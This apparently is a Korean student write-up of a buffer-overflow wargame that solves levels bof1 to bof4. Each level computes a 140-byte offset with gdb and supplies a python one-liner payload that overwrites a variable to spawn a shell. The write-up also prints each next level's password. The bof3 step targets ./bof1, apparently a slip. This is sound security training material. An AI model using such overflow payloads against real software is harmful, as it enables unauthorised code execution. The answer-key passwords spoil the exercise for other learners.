# Assignment

```shell
 $ docker run -it --privileged ccss17/bof
 $ cd crackme
```

> ID는 bof1, Password는 °ࡇ° ? ? ?

<br/>

### 4 - bof1

```shell
 $ vi bof1.c
```

![04-bof_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/04-bof1_code.png?raw=true)

bof1.c의 소스 코드를 확인한다.

![04-buf_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/04-buffer_address.png?raw=true)

gdb 실행파일을 열어서 buf 주소를 확인한다.

![04-innocent_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/04-innocent_address.png?raw=true)

gdb 실행파일을 열어서 innocent 주소를 확인한다.

![04-sub_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/04-sub_address.png?raw=true)

buf와 innocent의 거리를 알아낸다.
innocent의 주소가 -4되어 있었기 때문에 구한 거리에서 -4를 해준다.

즉 buf와 innocent의 거리는 140이다.

```shell
 $ (python -c "print 'x'*140 + 'aaaa'";cat) | ./bof1
```

![04-pw](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/04-pw.png?raw=true)

쉘을 열어주고
쉘 권한으로 bof2.pw를 읽어준다.

> bof2의 비밀번호는 e31a76fc 이다.

<br/>
<br/>

### 5 - bof2

```shell
 $ vi bof2.c
```

![05-bof_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/05-bof2_code.png?raw=true)

bof2.c의 소스 코드를 확인한다.

![05-buf_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/05-buf_address.png?raw=true)

strcpy를 찾아서 buf의 주소를 알아낸다.

![05-innocent_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/05-innocent_address.png?raw=true)

compare 함수 부분에 가서 innocent의 주소를 알아낸다.

![05-sub_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/05-sub_address.png?raw=true)

buf와 innocent의 거리를 알아낸다.
innocent의 주소가 -4되어 있었기 때문에 구한 거리에서 -4를 해준다.

즉 buf와 innocent의 거리는 140이다.

```shell
 $ ./bof2 `python -c "print 'x'*140+'aaaa'"`cat
```

![05-pw](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/05-pw.png?raw=true)

쉘을 열어주고
쉘 권한으로 bof3.pw를 읽어준다.

> bof3의 비밀번호는 78ac9531 이다.

<br/>
<br/>

### 6 - bof3

```shell
 $ vi bof3.c
```

![06-bof3_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/06-bof3_code.png?raw=true)

bof3.c의 소스 코드를 확인한다.

![06-buf_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/06-buf_address.png?raw=true)

gdb 실행파일을 열어서 buf 주소를 확인한다.

![06-innocent_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/06-innocent_address.png?raw=true)

gdb 실행파일을 열어서 innocent 주소를 확인한다.

![06-sub_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/06-sub_address.png?raw=true)

buf와 innocent의 거리를 알아낸다.
innocent의 주소가 -4되어 있었기 때문에 구한 거리에서 -4를 해준다.

즉 buf와 innocent의 거리는 140이다.

```shell
 $ (python -c "print 'x'*140 + 'aaaa'";cat) | ./bof1
```

![06-pw](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/06-pw.png?raw=true)

쉘을 열어주고,
쉘 권한으로 bof4.pw를 읽어준다.

> bof4의 비밀번호는 64869b0d 이다.

<br/>
<br/>

### 7 - bof4

```shell
 $ vi bof4.c
```

![07-bof_code](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/07-bof4_code.png?raw=true)

bof4.c의 소스 코드를 확인한다.

![07-buf_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/07-buf_address.png?raw=true)

gdb 실행파일을 열어서 buf 주소를 확인한다.

![07-innocent_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/07-innocent_address.png?raw=true)

gdb 실행파일을 열어서 innocent 주소를 확인한다.

![07-sub_address](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/07-sub_address.png?raw=true)

buf와 innocent의 거리를 알아낸다.
innocent의 주소가 -4되어 있었기 때문에 구한 거리에서 -4를 해준다.

즉 buf와 innocent의 거리는 140이다.

```shell
 $ ./bof4 `python -c "print 'x'*140+'\x78\x56\x34\x12'"`
```

![07-pw](https://github.com/YYYEJI/GBC_SECURITY/blob/master/img/07-pw.png?raw=true)

쉘을 열어주고
쉘 권한으로 bof5.pw를 읽어준다.

> bof5의 비밀번호는 c75cfe84 이다.
